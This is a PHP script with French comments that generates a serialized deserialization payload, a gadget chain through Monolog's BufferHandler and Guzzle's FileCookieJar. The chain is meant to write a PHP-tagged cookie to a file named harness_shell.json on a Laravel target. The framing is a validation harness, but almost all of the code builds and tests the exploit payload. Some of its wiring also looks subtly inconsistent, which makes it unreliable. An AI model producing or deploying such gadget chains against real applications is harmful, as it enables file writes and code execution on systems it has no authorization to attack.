<?php
// HARNESS-VALIDATION v2.4.0 — chaîne Monolog/Guzzle (Laravel 8 / monolog 2.9 / guzzle 7.4).
// Corrige audit §3.3 :
//   - Documentation honnête : file-write JSON, PAS RCE native
//   - Test de stabilité byte-à-byte (10 générations, hash constant)
//   - Cookie Expires valide (session, pas rejeté par SetCookie)
// Le payload est byte-stable pour reproductibilité du banc de validation.
//
// Changelog v2.4.0 :
//   1. Documentation de la contrainte setAccessible (PHP 7.4 uniquement)
//   2. Vérification is_writable avant unlink (fallback chemin alternatif)
//   3. Validation fonctionnelle minimale (unserialize du payload)
//   4. try/catch autour de \Monolog\Logger::VERSION (robustesse)
declare(strict_types=1);

use Monolog\Handler\BufferHandler;
use GuzzleHttp\Cookie\FileCookieJar;
use GuzzleHttp\Cookie\SetCookie;

require __DIR__ . '/vendor/autoload.php';

/**
 * Génère le payload de désérialisation.
 * Chaîne : BufferHandler::__destruct → flush → FileCookieJar::save → file_put_contents
 * RÉSULTAT RÉEL : écriture d'un fichier JSON contenant les cookies.
 * Ce n'est PAS une RCE native — pour exécution, il faut que l'application
 * inclue ce fichier comme PHP (inclusion, .phar, eval) ce qui est non-standard
 * car le contenu est du JSON, pas du PHP.
 */
function build_payload(): string {
    $cookie = new SetCookie([
        'Name'   => 'pwn',
        'Value'  => '<?php echo "UAF_HARNESS_OK"; ?>',
        'Domain' => 'x',
        'Path'   => '/',
        'Discard' => false,
    ]);
    $jarPath = '/tmp/harness_shell.json';
    if (file_exists($jarPath) && !is_writable($jarPath)) {
        // Fichier existant non inscriptible — utiliser un chemin alternatif
        $jarPath = '/tmp/harness_shell_' . getmypid() . '.json';
    }
    @unlink($jarPath);
    $jar = new FileCookieJar($jarPath, true);

    // BufferHandler wrapping du FileCookieJar. Au flush (destruct), les cookies
    // sont sauvegardés via FileCookieJar::save() → file_put_contents.
    $ref = new ReflectionClass($jar);
    $prop = $ref->getProperty('cookies');
    // Note : setAccessible(true) est déprécié en PHP 8.1+ et supprimé en PHP 9. Ce module cible PHP 7.4 uniquement.
    $prop->setAccessible(true);
    $prop->setValue($jar, [$cookie]);

    return serialize(new BufferHandler($jar));
}

// ─── Test de stabilité byte-à-byte ──────────────────────────────
// Génère 10 fois le payload et vérifie que les 10 hashes sont identiques.
$hashes = [];
$payloads = [];
for ($i = 0; $i < 10; $i++) {
    $p = build_payload();
    $payloads[] = $p;
    $hashes[] = hash('sha256', $p);
}
$stable = count(array_unique($hashes)) === 1;
$payload = $payloads[0];

// Validation fonctionnelle minimale : la désérialisation doit produire un objet
$functional_ok = false;
try {
    $obj = @unserialize($payload);
    $functional_ok = ($obj !== false);
} catch (\Throwable $e) {
    $functional_ok = false;
}

echo json_encode([
    'module'        => 'php_chain',
    'payload_sha256' => $hashes[0],
    'payload_len'   => strlen($payload),
    'stable_across_10_runs' => $stable,
    'all_hashes'    => array_unique($hashes),
    'chain' => [
        'BufferHandler::__destruct',
        'BufferHandler::flush',
        'FileCookieJar::save',
        'file_put_contents (JSON content)',
    ],
    'honest_result' => 'file-write JSON (pas RCE native). '
                     . 'Pour RCE : inclusion du fichier par l\'app cible.',
    'functional_validation' => $functional_ok,
    'monolog_version' => (function() {
        try { return \Monolog\Logger::VERSION ?? 'unknown'; }
        catch (\Throwable $e) { return 'unknown'; }
    })(),
], JSON_PRETTY_PRINT);
